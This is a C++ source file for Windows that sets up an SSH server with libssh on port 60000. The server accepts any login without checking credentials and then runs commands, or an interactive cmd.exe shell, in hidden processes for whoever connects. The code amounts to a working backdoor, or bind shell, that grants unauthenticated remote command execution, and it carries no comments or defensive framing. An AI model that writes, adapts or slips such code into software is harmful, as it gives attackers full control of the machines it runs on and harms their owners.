#define _WIN32_WINNT 0x0601
#define LIBSSH_STATIC
#include <openssl/ssl.h>
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/callbacks.h>
#include <openssl/err.h>
#include <cstdlib>
#include <string>
#include <windows.h>

std::string execute_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: Failed to create pipe\n";
    }
    
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&pi, sizeof(pi));
    
    std::string cmdLine = "cmd.exe /c " + cmd;
    char* cmdLineBuf = new char[cmdLine.length() + 1];
    strcpy_s(cmdLineBuf, cmdLine.length() + 1, cmdLine.c_str());
    
    if (!CreateProcessA(NULL, cmdLineBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        delete[] cmdLineBuf;
        return "Error: Failed to execute command\n";
    }
    
    delete[] cmdLineBuf;
    CloseHandle(hWritePipe);
    
    std::string output;
    char buffer[4096];
    DWORD bytesRead;
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    
    return output;
}

int handle_session(ssh_session session) {
    ssh_channel channel = NULL;
    int rc;
    
    bool authenticated = false;
    while (!authenticated) {
        ssh_message message = ssh_message_get(session);
        if (message == NULL) {
            break;
        }
        
        int msg_type = ssh_message_type(message);
        int msg_subtype = ssh_message_subtype(message);
        
        if (msg_type == SSH_REQUEST_AUTH) {
            if (msg_subtype == SSH_AUTH_METHOD_NONE || 
                msg_subtype == SSH_AUTH_METHOD_PASSWORD ||
                msg_subtype == SSH_AUTH_METHOD_PUBLICKEY) {
                ssh_message_auth_reply_success(message, 0);
                authenticated = true;
                ssh_message_free(message);
                break;
            }
        }
        ssh_message_reply_default(message);
        ssh_message_free(message);
    }
    
    if (!authenticated) {
        return EXIT_FAILURE;
    }

    while (channel == NULL) {
        ssh_message message = ssh_message_get(session);
        if (message == NULL) {
            break;
        }

        int msg_type = ssh_message_type(message);
        int msg_subtype = ssh_message_subtype(message);

        if (msg_type == SSH_REQUEST_CHANNEL_OPEN &&
            msg_subtype == SSH_CHANNEL_SESSION) {
            channel = ssh_message_channel_request_open_reply_accept(message);
        } else {
            ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    }

    if (channel == NULL) {
        return EXIT_FAILURE;
    }

    bool shell_requested = false;
    while (1) {
        ssh_message message = ssh_message_get(session);
        if (message == NULL) {
            break;
        }

        int msg_type = ssh_message_type(message);
        int msg_subtype = ssh_message_subtype(message);

        if (msg_type == SSH_REQUEST_CHANNEL) {
            if (msg_subtype == SSH_CHANNEL_REQUEST_SHELL) {
                ssh_message_channel_request_reply_success(message);
                shell_requested = true;
                ssh_message_free(message);
                break;
            } else if (msg_subtype == SSH_CHANNEL_REQUEST_EXEC) {
                const char* cmd = ssh_message_channel_request_command(message);
                if (cmd) {
                    ssh_message_channel_request_reply_success(message);
                    
                    std::string output = execute_command(cmd);
                    ssh_channel_write(channel, output.c_str(), output.length());
                    
                    ssh_message_free(message);
                    ssh_channel_send_eof(channel);
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    return EXIT_SUCCESS;
                } else {
                    ssh_message_reply_default(message);
                }
            } else {
                ssh_message_reply_default(message);
            }
        } else {
            ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    }

    if (shell_requested) {
        HANDLE hChildStdInRead = NULL;
        HANDLE hChildStdInWrite = NULL;
        HANDLE hChildStdOutRead = NULL;
        HANDLE hChildStdOutWrite = NULL;
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;
        
        if (!CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &sa, 0)) {
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            return EXIT_FAILURE;
        }
        SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);
        
        if (!CreatePipe(&hChildStdInRead, &hChildStdInWrite, &sa, 0)) {
            CloseHandle(hChildStdOutRead);
            CloseHandle(hChildStdOutWrite);
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            return EXIT_FAILURE;
        }
        SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hChildStdOutWrite;
        si.hStdOutput = hChildStdOutWrite;
        si.hStdInput = hChildStdInRead;
        si.dwFlags |= STARTF_USESTDHANDLES;
        ZeroMemory(&pi, sizeof(pi));
        
        char cmdLine[] = "cmd.exe";
        if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(hChildStdInRead);
            CloseHandle(hChildStdInWrite);
            CloseHandle(hChildStdOutRead);
            CloseHandle(hChildStdOutWrite);
            ssh_channel_close(channel);
            ssh_channel_free(channel);
            return EXIT_FAILURE;
        }
        
        CloseHandle(hChildStdOutWrite);
        CloseHandle(hChildStdInRead);
        
        DWORD mode = PIPE_NOWAIT;
        SetNamedPipeHandleState(hChildStdOutRead, &mode, NULL, NULL);
        
        char ssh_buffer[4096];
        char proc_buffer[4096];
        bool running = true;
        
        while (running) {
            DWORD exitCode;
            if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
                break;
            }
            
            int nbytes = ssh_channel_read_nonblocking(channel, ssh_buffer, sizeof(ssh_buffer), 0);
            if (nbytes > 0) {
                DWORD written;
                if (!WriteFile(hChildStdInWrite, ssh_buffer, nbytes, &written, NULL)) {
                    break;
                }
            } else if (nbytes < 0) {
                break;
            }
            
            DWORD bytesRead;
            if (ReadFile(hChildStdOutRead, proc_buffer, sizeof(proc_buffer), &bytesRead, NULL)) {
                if (bytesRead > 0) {
                    ssh_channel_write(channel, proc_buffer, bytesRead);
                }
            }
            
            Sleep(10);
        }
        
        TerminateProcess(pi.hProcess, 0);
        WaitForSingleObject(pi.hProcess, 1000);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hChildStdInWrite);
        CloseHandle(hChildStdOutRead);
    }

    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return EXIT_SUCCESS;
}

int ssh_main() {
    ssh_bind sshbind;
    ssh_session session;
    int rc;

    rc = ssh_init();
    if (rc < 0) {
        return EXIT_FAILURE;
    }

    sshbind = ssh_bind_new();
    if (!sshbind) {
        ssh_finalize();
        return EXIT_FAILURE;
    }

    int port = 60000;
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
    
    ssh_key rsa_key;
    rc = ssh_pki_generate(SSH_KEYTYPE_RSA, 2048, &rsa_key);
    if (rc != SSH_OK) {
        ssh_bind_free(sshbind);
        ssh_finalize();
        return EXIT_FAILURE;
    }
    
    rc = ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_IMPORT_KEY, rsa_key);
    if (rc != SSH_OK) {
        ssh_key_free(rsa_key);
        ssh_bind_free(sshbind);
        ssh_finalize();
        return EXIT_FAILURE;
    }

    rc = ssh_bind_listen(sshbind);
    if (rc != SSH_OK) {
        ssh_bind_free(sshbind);
        ssh_finalize();
        return EXIT_FAILURE;
    }

    while (1) {
        session = ssh_new();
        if (!session) {
            ssh_bind_free(sshbind);
            ssh_finalize();
            return EXIT_FAILURE;
        }

        rc = ssh_bind_accept(sshbind, session);
        if (rc != SSH_OK) {
            ssh_free(session);
            break;
        }

        rc = ssh_handle_key_exchange(session);
        if (rc != SSH_OK) {
            ssh_disconnect(session);
            ssh_free(session);
            continue;
        }

        ssh_set_auth_methods(session, SSH_AUTH_METHOD_NONE);

        handle_session(session);

        ssh_disconnect(session);
        ssh_free(session);
    }

    ssh_bind_free(sshbind);
    ssh_finalize();
    
    return EXIT_SUCCESS;
}